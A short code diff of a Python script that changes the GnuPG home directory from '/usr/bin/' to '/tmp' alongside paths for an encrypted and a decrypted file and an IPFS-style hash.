@@ -5,7 +5,7 @@ import pickle
 import requests
 
 print('Executing the global commands...')
-gpg = gnupg.GPG(gnupghome='/usr/bin/', verbose=True)
+gpg = gnupg.GPG(gnupghome='/tmp', verbose=True)
 file_hash = 'QmdLMnwpbi8xPFcpRGqsfHCRGVgovV3yAv8fUtoug66Wqj'
 encrypted_file_path = '/tmp/encrypted_file.txt'
 decrypted_file_path = '/tmp/decrypted_file.txt'
